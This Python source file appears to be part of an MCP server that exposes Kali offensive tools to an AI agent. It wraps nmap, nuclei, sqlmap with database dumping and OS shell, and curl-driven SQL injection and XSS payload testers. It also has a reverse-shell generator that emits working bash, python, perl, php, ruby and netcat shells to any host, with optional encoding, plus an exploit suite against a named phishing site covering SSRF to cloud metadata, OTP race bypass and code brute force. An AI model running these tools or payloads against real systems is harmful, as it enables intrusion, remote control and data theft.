        return json.dumps({"error": str(e), "warning": warning_msg}, indent=2)


async def _run_nmap_background(task_id: str, target: str, scan_type: str, ports: Optional[str], intensity: str, timeout: int):
    """Exécution en arrière-plan de Nmap"""
    try:
        scan_profiles = {
            "quick": ["-F", "-T4", "--open"],
            "basic": ["-sV", "-sC", "-T3"],
            "comprehensive": ["-sV", "-sC", "-O", "-A", "--version-all"],
            "stealth": ["-sS", "-T2", "-f", "--data-length", "50"],
            "vuln": ["-sV", "--script=vuln,exploit,auth", "-T3"],
            "udp": ["-sU", "-sV", "--top-ports", "100", "-T4"],
            "aggressive": ["-sS", "-sV", "-sC", "-O", "-A", "-T4", "--script=default,vuln"]
        }
        
        intensity_timing = {
            "stealth": "-T1",
            "low": "-T2", 
            "medium": "-T3",
            "high": "-T4",
            "aggressive": "-T5"
        }
        
        if scan_type not in scan_profiles:
            error_msg = f"Invalid scan_type. Choose from: {list(scan_profiles.keys())}"
            tasks.tasks[task_id].fail(json.dumps({"error": error_msg}, indent=2))
            return
        
        cmd = ["nmap"] + scan_profiles[scan_type]
        
        if intensity in intensity_timing and "-T" not in str(scan_profiles[scan_type]):
            cmd.append(intensity_timing[intensity])
        
        if ports:
            cmd.extend(["-p", ports])
        elif scan_type == "comprehensive":
            cmd.extend(["-p-"])
        
        cmd.append(target)
        
        # Convert command to string
        cmd_str = ' '.join(cmd)
        
        # Run the command with our improved executor
        result = await executor.run_command(cmd_str, timeout=timeout)
        
        # Format result
        formatted_result = {
            "stdout": result[0],
            "stderr": result[1],
            "return_code": result[2],
            "command": cmd_str
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def nuclei_scan(target: str, templates: Optional[str] = None, severity: str = "medium,critical,high", timeout: int = 900) -> str:
    """Scan de vulnérabilités avec Nuclei - Exécution asynchrone"""
    try:
        # Create a background task
        task_id = tasks.create_task(target, "nuclei")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_nuclei_background,
            task_id, target, templates, severity, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"Nuclei scan lancé en arrière-plan. Utilisez check_task('{task_id}') dans 5-10 minutes.",
            "estimated_time": "5-10 minutes",
            "severity": severity,
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


async def _run_nuclei_background(task_id: str, target: str, templates: Optional[str], severity: str, timeout: int):
    """Exécution en arrière-plan de Nuclei"""
    try:
        cmd = ["nuclei", "-u", target, "-severity", severity]
        if templates:
            cmd.extend(["-t", templates])
        
        # Convert command to string
        cmd_str = ' '.join(cmd)
        
        # Run the command with our improved executor
        result = await executor.run_command(cmd_str, timeout=timeout)
        
        # Format result
        formatted_result = {
            "stdout": result[0],
            "stderr": result[1],
            "return_code": result[2],
            "command": cmd_str
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def reverse_shell_generator(lhost: str, lport: int = 4444, shell_type: str = "bash", encoding: Optional[str] = None) -> str:
    """Générer des reverse shells pour différents types de shell"""
    try:
        shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "sh": f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{lhost}\\\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{lhost}\\\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'",
            "perl": f"perl -e 'use Socket;$i=\\\"{lhost}\\\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");}};'",
            "php": f"php -r '$sock=fsockopen(\\\"{lhost}\\\",{lport});exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
            "ruby": f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\\\"{lhost}\\\",\\\"{lport}\\\");while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){{|io|c.print io.read}}end'",
            "nc": f"nc {lhost} {lport} -e /bin/sh",
            "ncat": f"ncat {lhost} {lport} -e /bin/sh"
        }
        
        payload = shells.get(shell_type, shells["bash"])
        
        if encoding == "base64":
            payload = base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            payload = urllib.parse.quote(payload)
        
        return json.dumps({
            "shell_type": shell_type,
            "payload": payload,
            "encoded": encoding is not None
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def smart_scanner(target: str) -> str:
    """Scanner intelligent qui sélectionne automatiquement la meilleure stratégie d'attaque"""
    try:
        # First, perform tactical reconnaissance
        recon_data = await recon.quick_recon(target)
        
        # Use the existing auto-select strategy from VulnerabilityScanner
        vuln_scanner = VulnerabilityScanner()
        strategy = await vuln_scanner.auto_select_strategy(target, recon_data)
        
        # Get the triage plan
        plan = TriageEngine.generate_plan(recon_data)
        
        # Return comprehensive analysis
        result = {
            "target": target,
            "recon": recon_data,
            "defense_analysis": strategy,
            "attack_plan": plan,
            "recommended_approach": strategy['strategy'],
            "next_steps": [
                "1. Activer ghost_mode_toggle si des protections sont détectées",
                "2. Utiliser distributed_assault pour les attaques distribuées",
                "3. Suivre avec check_task pour surveiller les résultats"
            ]
        }
        
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


@mcp.tool()
async def server_health() -> str:
    """Vérifier l'état du serveur et les outils disponibles"""
    try:
        tools = [
            "nmap", "gobuster", "dirb", "nikto", "sqlmap", "msfconsole",
            "hydra", "john", "hashcat", "wpscan", "enum4linux", "amass",
            "dnsrecon", "theharvester", "whatweb", "wfuzz", "ffuf",
            "nuclei", "subfinder", "httpx", "curl", "wget"
        ]
        
        tool_status = {}
        for tool in tools:
            result = run_command_advanced(["which", tool], timeout=5)
            tool_status[tool] = {
                "available": result["success"],
                "path": result["stdout"] if result["success"] else None
            }
        
        available = [t for t, s in tool_status.items() if s["available"]]
        missing = [t for t, s in tool_status.items() if not s["available"]]
        
        result = {
            "status": "ok",
            "available_tools": available,
            "missing_tools": missing,
            "total_available": len(available),
            "total_missing": len(missing)
        }
        
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def sql_injection_test(url: str, param: str, method: str = "GET", data: Optional[str] = None, db_type: str = "generic", custom_payloads: Optional[List[str]] = None, timeout: int = 300) -> str:
    """Test d'injection SQL manuel avec des payloads personnalisés"""
    try:
        generic_payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin'--",
            "'; DROP TABLE users--"
        ]
        
        payloads = custom_payloads or generic_payloads
        
        results = []
        for payload in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            if method.upper() == "POST":
                cmd = ["curl", "-X", "POST", "-d", f"{param}={payload}", url]
            else:
                cmd = ["curl", test_url]
            
            result = run_command_advanced(cmd, timeout=timeout)
            
            # Simple SQL error detection
            vulnerable_indicators = ["SQL", "syntax", "mysql", "postgresql", "ORA-", "Microsoft OLE DB"]
            vulnerable = any(indicator.lower() in result["stdout"].lower() or indicator.lower() in result["stderr"].lower() for indicator in vulnerable_indicators)
            
            results.append({
                "payload": payload,
                "vulnerable": vulnerable,
                "response_preview": result["stdout"][:200]
            })
        
        return json.dumps({
            "url": url,
            "parameter": param,
            "method": method,
            "payloads_tested": len(payloads),
            "results": results
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def sqlmap_scan(url: str, data: Optional[str] = None, method: str = "GET", param: Optional[str] = None, dbms: Optional[str] = None, level: int = 3, risk: int = 2, technique: str = "BEUSTQ", dump: bool = False, tables: bool = False, dbs: bool = False, os_shell: bool = False, tamper: Optional[str] = None, timeout: int = 1200) -> str:
    """Test d'injection SQL avancé avec SQLMap - Exécution asynchrone"""
    try:
        # Create a background task
        task_id = tasks.create_task(url, "sqlmap")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_sqlmap_background,
            task_id, url, data, method, param, dbms, level, risk, 
            technique, dump, tables, dbs, os_shell, tamper, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"SQLMap lancé en arrière-plan. Utilisez check_task('{task_id}') dans 5-15 minutes.",
            "estimated_time": "5-15 minutes",
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


async def _run_sqlmap_background(task_id: str, url: str, data: Optional[str], method: str, param: Optional[str], dbms: Optional[str], level: int, risk: int, technique: str, dump: bool, tables: bool, dbs: bool, os_shell: bool, tamper: Optional[str], timeout: int):
    """Exécution en arrière-plan de SQLMap"""
    try:
        timestamp = generate_timestamp()
        output_dir = os.path.join(TOOL_LOG_DIR, f"sqlmap_{sanitize_filename(url)}_{timestamp}")
        os.makedirs(output_dir, exist_ok=True)
        
        cmd = [
            "sqlmap",
            "-u", url,
            "--batch",
            "--output-dir", output_dir,
            f"--level={level}",
            f"--risk={risk}",
            f"--technique={technique}",
            "--threads=4",
            "--random-agent"
        ]
        
        if data:
            cmd.extend(["--data", data])
        
        if method.upper() == "POST":
            cmd.append("--method=POST")
        
        if param:
            cmd.extend(["-p", param])
        
        if dbms:
            cmd.extend(["--dbms", dbms])
        
        if tamper:
            cmd.extend(["--tamper", tamper])
        
        if dbs:
            cmd.append("--dbs")
        
        if tables:
            cmd.append("--tables")
        
        if dump:
            cmd.append("--dump")
        
        if os_shell:
            cmd.append("--os-shell")
        
        # Convert command to string
        cmd_str = ' '.join(cmd)
        
        # Update task status
        # Note: We would need to modify TaskManager to support updating progress
        
        # Run the command with our improved executor
        result = await executor.run_command(cmd_str, timeout=timeout)
        
        # Format result
        formatted_result = {
            "stdout": result[0],
            "stderr": result[1],
            "return_code": result[2],
            "command": cmd_str,
            "output_dir": output_dir
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def force_tactical_mode(enable: bool) -> str:
    """Activer/désactiver le mode tactique strict (désactive les outils legacy)"""
    try:
        # This would typically modify a global configuration
        # For now, we'll just return a message indicating the mode change
        if enable:
            return "🎯 MODE TACTIQUE STRICT ACTIVÉ\n\nLes outils legacy seront désactivés.\nUtilisez les outils tactiques :\n• tactical_recon (reconnaissance)\n• distributed_assault (attaques distribuées)\n• ghost_mode_toggle (évasion)\n• check_task (suivi des tâches)"
        else:
            return "🔓 MODE TACTIQUE STRICT DÉSACTIVÉ\n\nLes outils legacy sont maintenant disponibles."
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


@mcp.tool()
async def start_session(session_name: Optional[str] = None) -> str:
    """Démarrer une nouvelle session de pentest"""
    try:
        global CURRENT_SESSION_ID
        
        timestamp = generate_timestamp()
        session_id = f"{session_name}_{timestamp}" if session_name else timestamp
        session_dir = os.path.join(SESSIONS_DIR, session_id)
        os.makedirs(session_dir, exist_ok=True)
        
        CURRENT_SESSION_ID = session_id
        
        result = {
            "status": "success",
            "session_id": session_id,
            "session_dir": session_dir,
            "message": f"Session '{session_id}' started"
        }
        
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def subdomain_enum(domain: str, tools: List[str] = ["subfinder", "amass"], wordlist: Optional[str] = None, timeout: int = 900) -> str:
    """Énumération de sous-domaines avec plusieurs outils - Exécution asynchrone"""
    try:
        # Create a background task
        task_id = tasks.create_task(domain, "subdomain_enum")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_subdomain_enum_background,
            task_id, domain, tools, wordlist, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"Énumération de sous-domaines lancée en arrière-plan. Utilisez check_task('{task_id}') dans 5-10 minutes.",
            "estimated_time": "5-10 minutes",
            "tools": tools,
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


async def _run_subdomain_enum_background(task_id: str, domain: str, tools: List[str], wordlist: Optional[str], timeout: int):
    """Exécution en arrière-plan de l'énumération de sous-domaines"""
    try:
        results = {}
        
        for tool in tools:
            if tool == "subfinder":
                cmd = ["subfinder", "-d", domain, "-silent"]
                if wordlist:
                    cmd.extend(["-w", wordlist])
            elif tool == "amass":
                cmd = ["amass", "enum", "-d", domain]
                if wordlist:
                    cmd.extend(["-w", wordlist])
            else:
                continue
            
            # Convert command to string
            cmd_str = ' '.join(cmd)
            
            # Run the command with our improved executor
            result = await executor.run_command(cmd_str, timeout=timeout)
            
            subdomains = result[0].split("\n") if result[0] else []
            results[tool] = [s for s in subdomains if s]
        
        # Combine and deduplicate
        all_subdomains = list(set(sum(results.values(), [])))
        
        formatted_result = {
            "domain": domain,
            "tools_used": tools,
            "subdomains_found": len(all_subdomains),
            "subdomains": sorted(all_subdomains),
            "by_tool": results
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def web_tech_detect(url: str, timeout: int = 60) -> str:
    """Détection des technologies web avec whatweb"""
    try:
        cmd = ["whatweb", url]
        result = run_command_advanced(cmd, timeout=timeout)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def wpscan_audit(url: str, enumerate: str = "vp,vt,u,dbe", api_token: Optional[str] = None, timeout: int = 900) -> str:
    """Audit de sécurité WordPress avec WPScan"""
    try:
        cmd = ["wpscan", "--url", url, "--enumerate", enumerate]
        if api_token:
            cmd.extend(["--api-token", api_token])
        
        result = run_command_advanced(cmd, timeout=timeout)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def xss_scan(url: str, param: str, method: str = "GET", data: Optional[str] = None, custom_payloads: Optional[List[str]] = None, timeout: int = 300) -> str:
    """Test de vulnérabilités XSS avec des payloads personnalisés"""
    try:
        payloads = custom_payloads or [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "'; alert('XSS'); '",
            "\"><script>alert('XSS')</script>"
        ]
        
        results = []
        for payload in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            if method.upper() == "POST":
                cmd = ["curl", "-X", "POST", "-d", f"{param}={payload}", url]
            else:
                cmd = ["curl", test_url]
            
            result = run_command_advanced(cmd, timeout=timeout)
            
            # Simple XSS detection
            vulnerable = payload in result["stdout"]
            
            results.append({
                "payload": payload,
                "vulnerable": vulnerable,
                "response_preview": result["stdout"][:200]
            })
        
        return json.dumps({
            "url": url,
            "parameter": param,
            "method": method,
            "payloads_tested": len(payloads),
            "results": results
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

# ============================================================================
# PHISHING SITE EXPLOITATION TOOLS
# ============================================================================

@mcp.tool()
async def test_phishing_ssrf(
    target_url: str = "http://169.254.169.254/latest/meta-data/"
) -> str:
    """
    Teste SSRF via endpoint /sendSms du site de phishing
    Cible: Accès à métadonnées AWS, fichiers locaux, services internes
    """
    try:
        result = await phishing_exploit.test_ssrf_sendSms(target_url)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def test_phishing_otp_bypass(
    phone: str = "+221123456789",
    num_requests: int = 50
) -> str:
    """
    Teste OTP Bypass via race condition
    Envoie N requêtes simultanées avec codes OTP différents
    """
    try:
        result = await phishing_exploit.test_otp_bypass_race(phone, num_requests)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def test_phishing_idor(
    code_range_start: int = 1000,
    code_range_end: int = 9999
) -> str:
    """
    Teste IDOR via énumération de codes d'invitation
    Cherche des codes valides par brute force
    """
    try:
        result = await phishing_exploit.test_invitation_code_idor(
            (code_range_start, code_range_end)
        )
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def test_phishing_sensitive_files() -> str:
    """
    Teste l'exposition de fichiers sensibles
    .map, .git, .bak, composer.json, etc.
    """
    try:
        result = await phishing_exploit.test_sensitive_files()
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def test_phishing_csrf() -> str:
    """
    Teste CSRF sur /doLogin et /register
    Vérifie absence de token CSRF et SameSite
    """
    try:
        result = await phishing_exploit.test_csrf_vulnerability()
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def test_phishing_dom_xss() -> str:
    """
    Teste DOM-based XSS via analyse du code JavaScript
    """
    try:
        result = await phishing_exploit.test_dom_xss()
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def run_phishing_exploit_suite(
    invitation_code: str = None
) -> str:
    """
    Exécute la suite complète d'exploits sur le site de phishing
    Teste: SSRF, OTP Bypass, IDOR, Fichiers sensibles, CSRF, DOM XSS
    """
    try:
        result = await phishing_exploit.run_full_exploit_suite(invitation_code)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

# ============================================================================
# OSINT & LEGITIMACY CHECKING TOOLS
# ============================================================================

@mcp.tool()
async def osint_domain_reputation(domain: str) -> str:
    """
    Vérifie la réputation du domaine via services externes
    VirusTotal, URLhaus, PhishTank, Google Safe Browsing
    """
    try:
        result = await osint_analyzer.check_domain_reputation(domain)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def osint_certificate_analysis(domain: str) -> str:
    """
    Analyse le certificat SSL/TLS
    Détecte les certificats auto-signés, expirés, wildcard
    """
    try:
        result = await osint_analyzer.analyze_certificate(domain)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def osint_dns_history(domain: str) -> str:
    """
    Vérifie l'historique DNS et les changements
    Récupère A, MX, NS, TXT records
    """
    try:
        result = await osint_analyzer.check_dns_history(domain)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def osint_whois_info(domain: str) -> str:
    """
    Récupère les informations WHOIS
    Détecte privacy protection et registrars suspects
    """
    try:
        result = await osint_analyzer.check_whois_info(domain)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def osint_wayback_machine(domain: str) -> str:
    """
    Vérifie l'historique Wayback Machine
    Détecte les domaines récemment créés
    """
    try:
        result = await osint_analyzer.check_wayback_machine(domain)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def osint_ssl_labs(domain: str) -> str:
    """
    Vérifie la sécurité SSL via SSL Labs
    Détecte les configurations SSL faibles
    """
    try:
        result = await osint_analyzer.check_ssl_labs(domain)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def run_full_osint_analysis(domain: str) -> str:
    """
    Exécute l'analyse OSINT complète
    Combine: Réputation, Certificat, DNS, WHOIS, Wayback, SSL Labs
    Retourne un score de phishing et d'évaluation de légitimité
    """
    try:
        result = await osint_analyzer.run_full_osint(domain)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

# ============================================================================
# ENDPOINT TESTING TOOLS
# ============================================================================

@mcp.tool()
async def test_sendSms_endpoint(phone: str = "+221123456789") -> str:
    """
    Teste l'endpoint /sendSms avec différents payloads
    Teste: SSRF, Parameter Pollution, Null Byte, Unicode Bypass
    """
    try:
        result = await endpoint_tester.test_sendSms_endpoint(phone)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def test_register_endpoint(
    phone: str = "+221123456789",
    invitation_code: str = None
) -> str:
    """
    Teste l'endpoint /register
    Teste: SQLi, XSS, Missing Fields, Invalid OTP Format
    """
    try:
        result = await endpoint_tester.test_register_endpoint(
            phone,
            invitation_code
        )
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def test_doLogin_endpoint() -> str:
    """
    Teste l'endpoint /doLogin
    Teste: SQLi, XSS, LDAP Injection, NoSQL Injection, Null Byte
    """
    try:
        result = await endpoint_tester.test_doLogin_endpoint()
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def test_api_endpoints() -> str:
    """
    Teste les endpoints API courants
    Cherche les endpoints accessibles sans authentification
    """
    try:
        result = await endpoint_tester.test_api_endpoints()
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def run_full_endpoint_test(
    phone: str = "+221123456789",
    invitation_code: str = None
) -> str:
    """
    Exécute tous les tests d'endpoints
    Combine: /sendSms, /register, /doLogin, /api/*
    Retourne un résumé des vulnérabilités trouvées
    """
    try:
        result = await endpoint_tester.run_full_endpoint_test(
            phone,
            invitation_code
        )
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

if __name__ == "__main__":
    import sys
    
    print("Arguments received:", sys.argv)
    logger.info("Initializing Kali MCP Tactical Server - Advanced Pentest Edition")
    
    # Run the server
    mcp.run(transport="stdio")
